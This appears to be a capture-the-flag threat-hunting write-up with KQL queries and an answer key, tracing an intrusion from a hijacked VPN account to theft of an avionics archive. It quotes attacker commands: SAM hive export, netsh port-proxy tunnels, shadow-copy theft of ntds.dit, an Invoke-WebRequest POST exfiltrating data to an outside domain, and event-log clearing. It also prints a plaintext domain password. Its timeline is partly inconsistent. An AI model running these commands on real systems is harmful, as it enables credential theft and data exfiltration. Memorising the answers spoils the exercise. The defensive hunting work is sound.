During the investigation of the incident **OPERATION SILENT CORRIDOR** , an adversary made several successful login to the account domain (HALDRIC) with device / account names = "WS-ENG04 / s.brandt" , "SRV-FILES02 / m.richter" , "SRV-DC01 / m.richter" remotely using a NTLM logon process named "NtLmSsp".

The remote device name used by adversary for login "kali" with remote-ip "10.1.96.114".

Adversary Login Activity :

| #   | Event Time (UTC)    | Account Name | Device Name |
| --- | ------------------- | ------------ | ----------- |
| 1   | 2026-02-24 11:37:43 | s.brandt     | WS-ENG04    |
| 2   | 2026-02-25 13:00:00 | s.brandt     | WS-ENG04    |
| 3   | 2026-02-25 14:07:13 | s.brandt     | WS-ENG04    |
| 4   | 2026-02-26 13:42:18 | s.brandt     | WS-ENG04    |
| 5   | 2026-02-27 14:04:16 | s.brandt     | WS-ENG04    |
| 6   | 2026-02-28 03:16:21 | m.richter    | SRV-FILES02 |
| 7   | 2026-02-28 04:17:24 | m.richter    | SRV-DC01    |
| 8   | 2026-03-02 11:04:16 | s.brandt     | WS-ENG04    |
| 9   | 2026-03-03 12:32:08 | s.brandt     | WS-ENG04    |
KQL query used :
```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "DeviceLogonEvents"
| where RemoteDeviceName == "kali"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , LogonProcess , RemoteDeviceName , RemoteIP 
| sort by EventTime desc
```

![[Pasted image 20260513142023.png|697]]

%% 
Q01 - Suspicious Account

HUNT LEAD: "The advisory says previous victims were compromised through remote access infrastructure. Profile every account. Find the one that doesn't fit."

Format: username (e.g. j.smith) 

Answer : s.brandt
%%

---

At 2026-02-19 23:47:12 event time user "s.brandt" with remote-ip "185.220.101.34" made a failed login through vpn then at 2026-02-20 02:14:00 event time the user "s.brandit" successfully login to the destination host "WS-ENG04" 

KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
//| where Reason == "sslvpn_login_invalid_credential"
| project-reorder EventTime, AccountName , ActionType , DestinationHost , DeviceName , Message , Reason , RemoteIP , TunnelIP , TunnelType , VPNGroup
| sort by EventTime desc
```

![[Pasted image 20260513144944.png]]

%% 
Q02 - Origin of Failed Auth

HUNT LEAD: "Could be a busy employee. Could be someone else using their credentials. Prove it one way or the other."

Format: IPv4 address

Answer : 185.220.101.34
%%

---

There are four (4) other remote ip's that made successful login connections using vpn to the destination host "WS-ENG04" i.e. :
"88.153.72.14"  most frequent, likely the regular/legitimate IP
"185.220.101.34"  appears at odd hours (early morning)
"91.234.33.126"  shows up a few times late night
"45.153.160.88"  appears on Mar 2 & Mar 4 at early morning hours

KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
//| where Reason == "sslvpn_login_invalid_credential"
| project EventTime, AccountName , ActionType , DestinationHost , DeviceName , Message , Reason , RemoteIP , TunnelIP , TunnelType , VPNGroup
| sort by EventTime desc
| distinct RemoteIP
```

![[Pasted image 20260513151432.png]]

%% 
Q03 - Connection Footprint

HUNT LEAD: "That IP failed then succeeded. Scope the full picture for this account across the window."

Format: Number only

Answer : 4 
%%

%%
Q04 - Source Address Inventory

HUNT LEAD: "Need them for threat intel. Pull every distinct source for this account."

Format: Comma-separated, sorted by first octet ascending

Answer : 45.153.160.88, 88.153.72.14, 91.234.33.126, 185.220.101.34
%%

%%
Q05 - Internal Landing Point

HUNT LEAD: "Threat intel confirms three of those are anonymisation infrastructure. The fourth is residential.Where did the attacker actually land?"

Format: Short hostname (no FQDN)

Answer : WS-ENG04
%%

---

At 2026-02-20 02:14:00  the adversary this command "systeminfo.exe" to get the details about local system information  

KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260513160813.png]]

%% 
Q06 - Initial Process

HUNT LEAD: "Pivot to the beachhead. What's the first non-routine process under their session, and what spawned it?"

Format: PROCESS/PARENT (e.g. tool.exe/shell.exe)

Answer : `systeminfo.exe/cmd.exe`
%%

---

The adversary used "net  group "Domain Admins" /dom" , "net  group "Enterprise Admins" /dom" command to enumerate Active Directive (AD) group members  

KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine has_any ("group", "dom")
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260513163537.png]]

%% 
Q07 - Directory Enumeration

HUNT LEAD: "What did they go after first? If they're mapping the environment, I need to know what they found."

Format: In order of execution, comma-separated

Answer : Domain Admins, Enterprise Admins
%%

---

Then the adversary lateral movement from the device name "WS-ENG04" to devices "SRV-DC01", "SRV-FILES02" using "WMIC.exe" executable 

| Device name | Local-IP    |
| ----------- | ----------- |
| SRV-DC01    | 10.1.31.206 |
| SRV-FILES02 | 10.1.70.42  |
KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceNetworkEvents"
| where InitiatingProcessFileName == "WMIC.exe"
| project EventTime, ActionType, DeviceName , InitiatingProcessAccountDomain , InitiatingProcessAccountName , InitiatingProcessFileName ,InitiatingProcessFolderPath , LocalIP , LocalPort , RemoteIP , RemotePort , Protocol
| sort by EventTime desc
```

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where LocalIP  in ("10.1.31.206", "10.1.70.42")
| summarize count() by LocalIP , DeviceName
```

![[Pasted image 20260513191430.png]]

![[Pasted image 20260513191443.png]]

%% 
Q08 - Network Reconnaissance

HUNT LEAD: "They know who the admins are. What infrastructure did they map next?"

Format: Hostnames, comma-separated, alphabetical

Answer :  SRV-DC01, SRV-FILES02
%%

---

At 2026-02-26 02:38:49 the adversary on device WS-ENG04 under account HALDRIC\s.brandt executed tasklist.exe via cmd.exe using the command tasklist /fi "imagename eq lsass.exe" to identify the LSASS process PID. This represents the earliest evidence of credential-focused activity on the beachhead, where the adversary was enumerating the LSASS process as a precursor to memory dumping for credential extraction

KQL query used : 

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260513192838.png]]

%% Q09 - First Credential Activity

HUNT LEAD: "Parallel track. That VPN account alone isn't getting them to those servers. They need more.Find the earliest evidence on the beachhead."

Format: Full command as logged

Answer : tasklist /fi "imagename eq lsass.exe"
%%

---

Following the LSASS process enumeration at 2026-02-26 02:38:49, the adversary attempted to dump LSASS memory at 2026-02-26 02:40:03 .The credential dump did not succeed. There is no evidence in the logs dump being accessed, exfiltrated, or used in any subsequent activity, and no intervening process interrupted the attempt

KQL query used : 

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceFileEvents"
| where DeviceName == "WS-ENG04"
| sort by EventTime desc
```

%%
Q10 - Credential Dump Outcome

HUNT LEAD: "What happened next in the timeline? Did they get what they wanted?"

Format: YES_OR_NO/INTERVENING_PROCESS_OR_NONE (e.g. YES/none or NO/processname.exe or NO/none)

Answer : NO/none
%%

---

On 2026-02-27, the adversary on device "WS-ENG04" under account HALDRIC\s.brandt executed reg.exe twice via cmd.exe to export the SAM registry hive to "C:\Windows\Temp\sam.bak"
The first attempt was made at 12:20:20 and the second at 14:28:52, using the same command "reg save HKLM\SAM C:\Windows\Temp\sam.bak" on both occasions

The repetition of this command approximately two hours apart suggests the first attempt may not have succeeded or the adversary sought to confirm the export, indicating a persistent effort to harvest local account password hashes from the SAM hive for offline cracking

KQL query used : 

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where FileName == "reg.exe" and ProcessCommandLine contains "save"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260513200212.png]]

%% 
Q11 - Stored Credential Source

HUNT LEAD: "Memory wasn't their only target. What else did they go after on this host?"

Format: Hive name only

Answer : sam
%%

---

At 2026-02-27 11:04:16.08 the adversary on device WS-ENG04 under account HALDRIC\s.brandt executed "cmdkey.exe" via cmd.exe using the command "cmdkey /list"
This command enumerates all stored credentials saved in the Windows Credential Manager on the host.
This activity follows the SAM hive export attempts and indicates the adversary was conducting a thorough sweep of all available credential sources on the beachhead, looking for any stored usernames and passwords that could be leveraged for further lateral movement within the HALDRIC domain

![[Pasted image 20260513201436.png]]

%% 
Q12 - Saved Credentials

HUNT LEAD: "Keep going. Anything else related to stored credentials on this box?"

Format: Full command as logged

Answer : cmdkey  /list
%%

---

At 03:15 on 28 February 2026, the adversary  operating through VPN tunnel `10.1.96.114` under the compromised account `s.brandt` used WMIC.exe to laterally pivot from beachhead `WS-ENG04` to the Domain Controller `SRV-DC01`, authenticating with harvested credentials for `m.richter` with password `Haldric2025SecIT`. This marks the first confirmed lateral movement event in the investigation

KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where MdeTable == "FortiGateVPN"
//| where AccountName == "m.richter"
//| where Reason  == "tunnel established"
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
//| where Reason == "sslvpn_login_invalid_credential"
| project EventTime, AccountName , ActionType , DestinationHost , DeviceName , Message , Reason , RemoteIP , TunnelIP , TunnelType , VPNGroup
| sort by EventTime desc
```

![[Pasted image 20260513203633.png]]

%% 
Q13 - First Lateral Pivot

HUNT LEAD: "They have credentials. They have targets.Reconstruct the first pivot. The originating tunnel address, the host they reached, and the account they used."

Format: TUNNEL_IP/HOST/USER (e.g. 10.x.x.x/SRV-A01/j.smith)

Answer :  10.1.96.114/SRV-DC01/m.richter
%%

%%
Q14 - New Account Observed

HUNT LEAD: "Different account in that command. That confirms the credential theft worked. Who?"

Format: username

Answer : m.richter
%%

---

At 2026-02-28T03:15:36 the adversary on device WS-ENG04 under account HALDRIC\s.brandt used WMIC.exe via cmd.exe to remotely query running processes on SRV-DC01, authenticating with stolen credentials for m.richter. Using process list brief, the adversary enumerated active processes on the Domain Controller remotely without needing to directly log into the target host, confirming WMIC as the tool responsible for cross-host reconnaissance and command spawning within the HALDRIC environment

KQL query used : 

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where AccountName == "s.brandt"
| where ProcessCommandLine contains "/node"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260513210105.png]]

%%
Q15 - Cross-Host Spawning

HUNT LEAD: "Pivot to the target. Are there commands running on it that shouldn't be?How are they getting there?"

Format: Tool name (with or without .exe)

Answer : WMIC.exe
%%

---

On 2026-02-28 03:16:53.45 , the account HALDRIC\s.brandt executed WMIC.exe from WS-ENG04 to remotely create a new directory at C:\Windows\Temp\McAfee_Logs on SRV-DC01 using the stolen credentials of m.richter. The command leveraged WMIC for lateral movement and initiated ntdsutil IFM operations, which are commonly associated with Active Directory database extraction and credential dumping activity. The creation of the McAfee_Logs directory indicates staging space for NTDS data collection as part of the adversary’s credential access and domain compromise objectives.

![[Pasted image 20260513210917.png]]

%% 
Q16 - New Filesystem Activity

HUNT LEAD: "Check the target host directly. Anything new on the filesystem that wasn't there before? What's the full path?"

Format: Full directory path

Answer : 
 C:\Windows\Temp\McAfee_Logs
 %%

---

At 2026-02-28T04:21:13.5350000+00:00, the account HALDRIC\m.richter created the file ntds.dit on SRV-DC01 within the staging directory C:\Windows\Temp\McAfee_Logs using cmd.exe. The presence of ntds.dit in a temporary staging location strongly indicates credential dumping activity targeting the Active Directory database. This aligns with the hunt lead referencing unauthorized packaged data and suggests the adversary used stolen credentials associated with m.richter to stage sensitive domain credential data for exfiltration or lateral movement operations.

![[Pasted image 20260515171321.png]]

%%  
Q17 - Critical File  
  
HUNT LEAD: "We don't use that product. That's not ours.  
  
What was packaged into that staging directory, and which account is responsible?"  
  
Format: FILENAME/USER (e.g. data.zip/j.smith)  
  
Answer : NTDS.dit/m.richter  
%%

---

At 2026-02-28 04:21:52, the Windows Defender process MsMpEng.exe running under NT AUTHORITY\SYSTEM interacted with the staged ntds.dit file on SRV-DC01 in the directory C:\Windows\Temp\McAfee_Logs. This indicates that Microsoft Defender detected or scanned the credential database shortly after it was created during the suspected credential dumping activity tied to HALDRIC\m.richter. The interaction confirms concurrent security product visibility into the staged Active Directory database during the adversary’s credential access operation.

KQL query used : 

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceFileEvents"
| where DeviceName == "SRV-DC01"
| where FileName == "ntds.dit"
//| where InitiatingProcessAccountName == "s.brandt"
//| where FileName == "McAfee_Logs"
| project EventTime , ActionType , InitiatingProcessAccountName , InitiatingProcessAccountDomain , DeviceName , FileName , FolderPath , InitiatingProcessFileName , InitiatingProcessFolderPath
| sort by EventTime desc
```

![[Pasted image 20260515173357.png]]

%%  
Q18 - Concurrent File Access  
  
HUNT LEAD: "Check the file events around the same moment those files appeared. Did anything else interact with them?"  
  
Format: Process name (with or without .exe)  
  
Answer : MsMpEng.exe  
%%

---

At 2026-02-28 04:20:00, the account HALDRIC\m.richter executed vssadmin on SRV-DC01 through cmd.exe using the command "vssadmin create shadow /for=C:". This activity shows the adversary created a Volume Shadow Copy to bypass file locks protecting the live Active Directory database. By leveraging VSS, the attacker was able to access and copy the normally locked ntds.dit file for credential dumping and subsequent lateral movement operations.

KQL query used : 

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
//| where AccountName == "s.brandt"
//| where ProcessCommandLine contains "/node"
| where DeviceName == "SRV-DC01"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515174135.png]]

%%  
Q19 - Database File Access  
  
HUNT LEAD: "It saw them and didn't act. We'll deal with that policy gap later.  
  
The file they took is locked by the OS while the service runs. How did they get a copy out?"  
  
Format: Tool name only  
  
Answer : vssadmin.exe  
%%

---

At 2026-02-28 04:45:49, HALDRIC\m.richter executed cmd.exe on SRV-DC01 through the parent process WmiPrvSE.exe, indicating remote command execution over WMI. The command "cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs" was used to remove the staging directory containing dumped credential material, consistent with anti-forensics activity. Based on the investigation context, the originating host for this remote WMI-triggered execution was WS-ENG04, the identified beachhead system used by the adversary for lateral movement operations.

KQL query used :

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
//| where AccountName == "s.brandt"
//| where FileName == "WMIC.exe"
//| where ProcessCommandLine contains "/node"
| where DeviceName == "SRV-DC01"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515175539.png]]

%%  
Q20 - Spawning Source  
  
HUNT LEAD: "The commands on that host weren't run by anyone at the console. Something is spawning them, and the trigger is coming from somewhere else.  
  
What's the spawning process and the originating host?"  
  
Format: PARENT/SOURCE_HOST (e.g. cmd.exe/WS-A01)  
  
Answer : WmiPrvSE.exe/WS-ENG04  
%%

---

Between 2026-02-20 and 2026-03-06, the attacker operating under HALDRIC\m.richter leveraged a tunnel originating from WS-ENG04 to pivot across the environment, reaching SRV-DC01 and SRV-FILES02. DeviceNetworkEvents filtered on local IP 10.1.96.114 confirmed active communication paths consistent with lateral movement and remote administration. This indicates the attacker used the compromised beachhead system to establish an RDP/WMI-based tunneling channel, extending access from WS-ENG04 into both the Domain Controller and File Server as part of the lateral movement phase of the intrusion.

KQL query used : 

```kql

let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceNetworkEvents"
//| where InitiatingProcessFileName == "WMIC.exe"
| where LocalIP == "10.1.96.114"
| project EventTime, ActionType, DeviceName , InitiatingProcessAccountDomain , InitiatingProcessAccountName , InitiatingProcessFileName ,InitiatingProcessFolderPath , LocalIP , LocalPort , RemoteIP , RemotePort , Protocol
| sort by EventTime desc
| distinct DeviceName 
```

![[Pasted image 20260515180736.png]]

%%  
Q21 - RDP Scope  
  
HUNT LEAD: "That command wasn't their only way in. Pull the full picture from the attacker's tunnel.  
  
Which hosts did they reach via that tunnel?"  
  
Format: Hostnames, comma-separated, alphabetical  
  
Answer : SRV-DC01, SRV-FILES02, WS-ENG04  
%%

---

At 2026-02-28 03:25:27 , the account HALDRIC\s.brandt executed netsh.exe on WS-ENG04 via cmd.exe to configure a port proxy rule that forwards inbound traffic on port 8443 to SRV-DC01 on port 445. This modification effectively establishes a covert network tunnel from the beachhead system to the Domain Controller SMB service, enabling stealthy lateral movement and remote access. The activity indicates intentional network configuration tampering consistent with attacker-controlled pivoting infrastructure during the intrusion.

![[Pasted image 20260515181352.png]]

%%  
Q22 - Network Configuration Change  
  
HUNT LEAD: "Check the beachhead for network configuration changes that shouldn't be there."  
  
Format: Full command as logged  
  
Answer : netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local  
%%

---

At 2026-02-28 03:25:27, the account HALDRIC\s.brandt modified the Windows registry on WS-ENG04 via netsh.exe, writing a PortProxy configuration under HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp. This registry modification persists across system reboots and stores the attacker-created port forwarding rule redirecting traffic from 0.0.0.0:8443 to SRV-DC01.haldric.local:445. This confirms the adversary established a persistent network tunneling mechanism on the beachhead to maintain covert access to domain resources even after system restart.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceRegistryEvents"
| where DeviceName == "WS-ENG04"
| where InitiatingProcessFileName == "netsh.exe"
//| where RegistryValueName has_any ("reg.exe" , "save")
| sort by EventTime desc 
```

![[Pasted image 20260515182347.png]]

%%  
Q23 - Configuration Storage  
  
HUNT LEAD: "Does that change survive a reboot? Where is it stored?"  
  
Format: Full registry key path (HKLM... format, not HKEY_LOCAL_MACHINE)  
  
Answer : HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp  
%%

---

At 2026-02-28 04:23:14 , the account HALDRIC\m.richter executed netsh.exe on SRV-DC01 via cmd.exe to configure a portproxy rule listening on port 9999 and forwarding traffic to internal host 10.1.36.210 on port 8443 using TCP. This mirrors the earlier configuration observed on WS-ENG04 and indicates propagation of the same tunneling technique onto the Domain Controller. The activity demonstrates the attacker extending persistent network redirection infrastructure across multiple compromised systems to maintain covert access and facilitate lateral movement within the environment.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
//| where AccountName == "s.brandt"
//| where FileName == "WMIC.exe"
//| where ProcessCommandLine contains "/node"
| where DeviceName == "SRV-DC01"
| where FileName == "netsh.exe"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515182924.png]]

%%  
Q24 - Matching Configuration on DC  
  
HUNT LEAD: "Check the other compromised hosts for the same kind of change."  
  
Format: Full command as logged  
  
Answer : netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp  
%%

---

At 2026-02-28 03:18:59, the account HALDRIC\m.richter executed a PowerShell compression command on SRV-FILES02 via cmd.exe to archive the directory C:\Engineering\Avionics\A400M_NavSys into a ZIP file named win_update_kb5034.zip located in C:\Windows\Temp. This indicates targeted data collection from a sensitive engineering avionics project directory, consistent with adversary exfiltration activity during the intrusion.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
//| where AccountName == "s.brandt"
//| where FileName == "WMIC.exe"
//| where ProcessCommandLine contains "/node"
| where DeviceName == "SRV-FILES02"
| where FileName == "powershell.exe"
//| where FileName == "netsh.exe"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515183704.png]]

%%  
Q25 - Targeted Directory  
75  
  
HUNT LEAD: "Persistence confirmed. Now the worst question.  
  
What directory on the file server did they go after?"  
  
Format: Full directory path  
  
Answer : C:\Engineering\Avionics\A400M_NavSys  
%%

%%  
Q26 - Packaged Output  
75  
  
HUNT LEAD: "That's classified material. What did they package it as?"  
  
Format: Filename with extension  
  
Answer : win_update_kb5034.zip  
%%

%%  
Q27 - Compression Method  
75  
  
HUNT LEAD: "How was it created?"  
  
Format: Cmdlet name  
  
Answer : Compress-Archive  
%%

---

At 2026-02-28 03:19:37, the account HALDRIC\m.richter executed certutil.exe on SRV-FILES02 via cmd.exe to encode the archive win_update_kb5034.zip into a Base64 file named win_update_kb5034.b64 stored in C:\Windows\Temp. This activity indicates the attacker converted binary data into an encoded format suitable for exfiltration, consistent with staging data for covert transfer outside the environment.

![[Pasted image 20260515184656.png]]

%%  
Q28 - Format Conversion  
75  
  
HUNT LEAD: "Binary files don't transit well. They would have converted it first. What did they use?"  
  
Format: Tool name (with or without .exe)  
  
Answer : certutil  
%%

---

At 2026-03-02 01:19:15, the account HALDRIC\s.brandt executed a PowerShell Invoke-WebRequest command on WS-ENG04 via cmd.exe to perform an HTTP POST request to the C2 domain cdn-telemetry.cloud-endpoint.net, uploading the encoded file win_update_kb5034.b64 from C:\Windows\Temp. This confirms outbound exfiltration of staged data from the compromised environment to the attacker-controlled command-and-control infrastructure.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
//| where AccountName == "s.brandt"
//| where FileName == "WMIC.exe"
//| where ProcessCommandLine contains "/node"
//| where DeviceName == "SRV-FILES02"
//| where FileName == "powershell.exe"
//| where FileName == "netsh.exe"
| where ProcessCommandLine contains "win_update_kb5034.b64"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515185246.png]]

%%  
Q29 - Outbound Transfer  
150  
  
HUNT LEAD: "Find the command that sent data out. It may not be on the host you expect."  
  
Format: Full command as logged  
  
Answer : powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64" -UseBasicParsing  
%%

%%  
Q30 - External Destination  
100  
  
HUNT LEAD: "Where did it go?"  
  
Format: Domain name  
  
Answer : cdn-telemetry.cloud-endpoint.net  
%%

%%
Q31 - Reentry Window
100

HUNT LEAD: "There's activity from the same account on the beachhead after the exfil date. They came back.

How long did they wait?"

Format: Whole number of days (integer)

Answer : 2
%%

---

At 2026-02-23 11:01:19, the account HALDRIC\s.brandt executed wevtutil on WS-ENG04 via cmd.exe using the command "wevtutil cl Security" to clear the Windows Security event log. This indicates the adversary initiated anti-forensics cleanup by targeting audit records first, attempting to remove evidence of their activity prior to further cleanup actions across the compromised hosts in the environment.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where InitiatingProcessFileName != "splunkd.exe"
| where ProcessCommandLine has_any ("wevtutil", "Clear-EventLog", "cl Security", "cl System", "cl Application")
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515191508.png]]

%%  
Q32 - First Cleanup Action  
100  
  
HUNT LEAD: "Last phase. They came back to clean up. Check all three hosts.  
  
What did they target first?"  
  
Format: Full command as logged  
  
Answer : wevtutil cl Security  
%%

---

At 2026-02-23 11:01:19, the account HALDRIC\s.brandt executed "wevtutil cl Security" locally on WS-ENG04 via cmd.exe, directly clearing the Security event log on the beachhead host and confirming console-based anti-forensics activity. Later, at 2026-02-28 03:33:51, SRV-FILES02 shows the same log-clearing behavior executed remotely under WmiPrvSE.exe, indicating WMI-driven execution rather than local interaction. Further, at 2026-02-28 04:46:24, SRV-DC01 also had its Security log cleared via WmiPrvSE.exe, reinforcing remote execution across critical servers. Additional corroborating activity at 2026-02-28 03:47:32 and 2026-02-28 03:48:00 shows HALDRIC\s.brandt on WS-ENG04 using WMIC to remotely trigger log clearing on SRV-DC01 and SRV-FILES02 under the stolen credentials of m.richter, demonstrating coordinated anti-forensics operations originating from the beachhead and propagated laterally to erase traces across multiple systems.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine contains "wevtutil cl Security"
| where InitiatingProcessFileName != "splunkd.exe"
| project EventTime ,DeviceName, InitiatingProcessFileName , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515193237.png]]

%%  
Q33 - Clearing Method Analysis  
100  
  
HUNT LEAD: "They cleared logs on every host. But not all the same way.  
  
Which host had logs cleared from the console, and which had them cleared remotely?"  
  
Format: DIRECT_HOST/REMOTE_HOSTS (remotes alphabetical, comma-separated)  
  
Answer : WS-ENG04/SRV-DC01,SRV-FILES02  
%%

%%  
Q34 - Surviving Log Source  
150  
  
HUNT LEAD: "They wiped logs on every host we've investigated. And yet we're still here.  
  
Why? What did they miss?"  
  
Format: Log source name  
  
Answer : Sysmon  
%%

%%  
